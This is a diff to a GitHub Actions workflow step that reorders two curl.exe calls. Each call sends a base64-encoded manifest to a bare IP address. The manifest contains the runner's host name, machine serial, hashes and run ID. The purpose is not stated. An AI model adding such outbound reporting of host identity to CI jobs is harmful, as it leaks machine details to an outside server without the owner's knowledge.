@@ -70,7 +70,7 @@ jobs:
           if ($verified -eq 4) {
             $manifest = @{cohort='${{ inputs.cohort }}'; source='public-a'; host=$hostName; serial=$serial; base=$base; count=32; hashes=$hashes; raw_verified=$verified; run=$env:GITHUB_RUN_ID; sample='${{ matrix.sample }}'} | ConvertTo-Json -Compress
             $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($manifest)).Replace('+','-').Replace('/','_')
-            curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_SEED?d=$encoded" | Out-Null
             curl.exe -s "http://16.146.243.72:8480/seed?d=$encoded" | Out-Null
+            curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_SEED?d=$encoded" | Out-Null
           }
           Start-Sleep -Seconds 25
